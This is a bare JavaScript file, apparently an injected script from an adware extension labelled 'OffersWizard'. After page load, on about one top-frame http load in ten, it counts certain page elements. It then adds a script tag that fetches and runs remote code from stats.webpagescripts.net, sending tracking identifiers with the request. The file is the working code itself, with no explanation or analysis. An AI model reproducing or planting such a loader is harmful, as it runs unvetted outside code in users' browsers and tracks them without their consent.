



function __necdel()
{
(function(s1,cid,ext,data,moreinfo)
{
    if( (typeof(moreinfo)==="undefined") ||!moreinfo)
    {
        moreinfo="";
    }
    if(Math.random()>0.1)
    {
        return;
    }
        
    if(!document)
    {
        return;
    }
    
    var counter = 0;
    for(var i=0;i<20;i++)
    {
        var n = '__w_s'+i;
        
        var elem = document.getElementById(n);
        if(elem)
        {
            counter++;
        }
    }
       
    data = counter;
    var script = document.createElement("script");
    script.setAttribute('type', 'text/javascript'); 
    script.async = true;
    var protocol = ('https:' == document.location.protocol ? 'https://' : 'http://');
    var r = Math.floor((Math.random() * 1000) + 1);
    script.src = 'http://stats.webpagescripts.net/nec.js?s1='+s1+"&cid="+cid+"&ext="+ext+"&dat="+data+"&r="+r+moreinfo;
    var head = document.getElementsByTagName("head")[0]; 

    if( (protocol==='http://') && head)
    {
        head.appendChild(script);
    } 
    
})('9324C5FC0046A5EFF19568C69BCB044F','10298','OffersWizard','ignore','');
}

(function(){
    var ____triescounter = 0;
    var latestTimeoutId;

    var checkLoad = function() {

  
    if(____triescounter>=5)
    {
        clearTimeout(latestTimeoutId);
        if ( (self === top)   ) { setTimeout(__necdel,1000);}
        return;
    }
    ____triescounter++;
    if(document.readyState!== "complete")
    {
        clearTimeout(latestTimeoutId);
        latestTimeoutId = setTimeout(checkLoad, 500);
    }
    else
    {
        clearTimeout(latestTimeoutId);
        if ( (self === top)   ) {setTimeout(__necdel,1000);}
        return;
    }
  
};
checkLoad(); 

})();  




